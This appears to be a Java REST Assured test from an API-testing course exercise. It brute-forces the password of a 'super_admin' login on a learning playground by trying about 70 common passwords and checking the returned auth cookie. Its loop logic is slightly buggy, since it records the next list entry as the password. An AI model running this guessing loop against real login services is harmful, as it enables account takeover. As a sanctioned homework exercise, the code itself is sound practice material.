package Lesson2;

import io.restassured.RestAssured;
import io.restassured.path.json.JsonPath;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;

import java.util.HashMap;
import java.util.Map;


public class EX9 {
    @Test
    public void pass() {
        //Задаем переменную для последующей печати верного пароля
        String rightPass = null;
        int i;
        for (i = 0; i < 70; i++) {
            Map<String, String> body = new HashMap<>();
            //значения пароля задаем массивом, будем подставлять по 1 значению по порядку
            String[] bodyy = {"password", "password1", "123456", "1234567", "12345678", "123456789", "1234567890", "12345",
                    "querty", "qwerty123", "qwertyuiop", "abc123", "football", "Football", "princess", "111111", "1234", "dragon",
                    "monkey", "master", "696969", "888888", "iloveyou", "admin", "letmein", "adobe123", "trustno1", "starwars",
                    "freedom", "azerty", "000000", "welcome", "michael", "mustang", "superman", "654321", "sunshine", "shadow", "1qaz2wsx",
                    "666666", "1q2w3e4r", "ninja", "qazwsx", "welcome", "bailey", "ashley", "passw0rd", "123123", "jesus", "solo",
                    "121212", "flower", "hottie", "zaq1zaq1", "whatever", "charlie", "aa123456", "donald", "123qwe", "baseball",
                    "login", "hello", "photoshop", "batman", "555555", "lovely", "7777777", "!@#$%^&*", "access", "loveme"};
            body.put("login", "super_admin");
            body.put("password", bodyy[i]);


            Response response = RestAssured
                    .given()
                    .body(body)
                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                    .andReturn();
            response.prettyPrint();
            String responseCookie = response.getCookie("auth_cookie");

            System.out.println("Cookie для авторизации = " + responseCookie);

            Map<String, String> cookies = new HashMap<>();
            if (responseCookie != null) {
                cookies.put("auth_cookie", responseCookie);
            }
            Response response2 = RestAssured
                    .given()
                    .cookies(cookies)
                    .get("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                    .andReturn();
            String resp2 = response2.asString();
            System.out.println(resp2);
//Когда успешно авторизовались - прерываем цикл
            if (resp2.equals("You are authorized")) {
                break;
               }  rightPass = bodyy[i+1];
           }
        //Распечатываем верный пароль
     System.out.println("Ваш пароль: " + rightPass); 
    }

    }



